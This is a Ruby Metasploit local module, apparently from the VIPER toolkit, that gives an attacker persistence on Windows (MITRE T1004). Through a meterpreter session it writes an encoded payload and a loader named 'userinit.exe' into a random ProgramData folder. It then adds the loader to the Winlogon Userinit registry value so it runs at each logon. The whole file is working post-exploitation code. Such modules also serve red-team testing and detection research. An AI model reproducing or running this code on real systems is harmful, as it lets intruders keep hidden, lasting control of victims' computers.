##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  include Msf::Post::Windows::Priv
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv

  DEFAULT_VAL_NAME = '' # This maps to "(Default)"
  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Winlogon Helper DLL (T1004) Windows - VIPER',
                      'Description'   => %q{
                          Persistence:
                          Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.
                          Registry entries in HKLM\Software[Wow6432Node]Microsoft\Windows NT\CurrentVersion\Winlogon\ and HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ are used to manage additional helper programs and functionalities that support Winlogon.},
                      'License'       => MSF_LICENSE,
                      'Author'        => ['Praetorian'],
                      'References'    => [['URL', 'https://attack.mitre.org/techniques/T1004/']],
                      'Platform'      => ['win'],
                      'Targets'       => [['Windows', {}]],
                      'SessionTypes'  => ['meterpreter'],
                      'DefaultTarget' => 0,
          ))
    register_options(
            [
                    OptString.new('REMOTE_EXE_PATH', [false, 'The remote victim exe path to run. Use temp directory as default. ']),
            ])
  end


  def exploit

    unless session.type == "meterpreter"
      pub_json_result(false,
                      'Unsupport shell type',
                      nil,
                      self.uuid)
      return
    end
    unless is_system? || is_admin?
      pub_json_result(false,
                      "Insufficient privileges to create reg",
                      nil,
                      self.uuid)
      return
    end

    if datastore['PAYLOAD'].include?(ARCH_X64)
      data_exe_file = "loader_x64.exe"
    else
      data_exe_file = "loader_x64.exe"
    end

    vprint_status("Running module against #{sysinfo['Computer']}")

    @storedir = create_store_rand_dir()
    if @storedir == nil
      pub_json_result(false,
                      'Create rand dir failed',
                      nil,
                      self.uuid)
      return
    end


    @exe_file       = "userinit.exe"
    @shellcode_file = "userinit.ini"

    buf            = create_payload
    shellcode_path = @storedir + "\\" + @shellcode_file
    write_file_to_target(shellcode_path, buf)


    @victim_path = @storedir + "\\" + @exe_file
    bin          = File.read(File.join(Msf::Config.data_directory, 'exploits', 'persistence_dll', data_exe_file))
    write_file_to_target(@victim_path, bin)


    unless session.fs.file.exist? shellcode_path and session.fs.file.exist? @victim_path
      pub_json_result(false,
                      'write loader to storedir failed,maybe permission or AV',
                      nil,
                      self.uuid)
      return
    end


    reg_base_key = "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
    reg_base_val = "Userinit"

    # add the logon script

    unless registry_key_exist? reg_base_key
      unless registry_createkey(reg_base_key)
        pub_json_result(false,
                        'crete registry failed',
                        nil,
                        self.uuid)
      end
    end

    reg_data = "C:\\WINDOWS\\system32\\userinit.exe,#{@victim_path}"
    if registry_setvaldata(reg_base_key, reg_base_val, reg_data, "REG_SZ")
      vprint_good("Success! To test persistence, log out and then log in.")
      pub_json_result(true,
                      nil,
                      @victim_path,
                      self.uuid)
      return
    else
      pub_json_result(false,
                      'write registry failed',
                      nil,
                      self.uuid)
    end

  end


  def create_payload
    p = payload.encoded
    Msf::Simple::Buffer.transform(p, 'hex', 'buf')
  end

  def create_store_rand_dir()
    dirname     = Rex::Text.rand_text_alpha(10)
    fulldirname = session.sys.config.getenv('ProgramData') + "\\" + dirname
    session.fs.dir.mkdir(fulldirname)
    if session.fs.file.exist? fulldirname
      vprint_good("create storedir : #{fulldirname}")
      return fulldirname
    else
      vprint_error("create storedir failed : #{fulldirname}")
      return nil
    end
  end

  def write_file_to_target(filepath, filedata)
    fd = session.fs.file.new(filepath, "wb")
    fd.write(filedata)
    fd.close
  end
end
